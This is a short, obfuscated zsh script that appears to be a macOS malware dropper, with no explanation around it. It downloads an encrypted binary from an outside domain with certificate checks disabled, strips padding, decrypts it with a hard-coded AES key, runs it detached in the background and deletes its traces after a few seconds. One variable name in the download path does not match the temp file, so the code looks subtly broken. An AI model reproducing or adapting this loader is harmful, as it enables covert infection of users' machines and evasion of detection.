#!/bin/zsh
ypg38=$(mktemp /tmp/s78sgq.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/mb53235f8a7fb8ea2.bin" -o "$ypg38z" || exit 1
tg82hf=$(stat -f %z "$ypg38z"); ncxs8tn=$(( tg82hf - 555 - 3900 ))
tail -c +$(( 555 + 1 )) "$ypg38z" | head -c $ncxs8tn | openssl enc -d -aes-256-cbc -k 540703ff56b20f3a9d82eadb -out "$ypg38" 2>/dev/null
[ -s "$ypg38" ] && chmod 700 "$ypg38" && ( "$ypg38" & ) && disown
( sleep 3; rm -f "$ypg38" "$ypg38z" ) &>/dev/null &
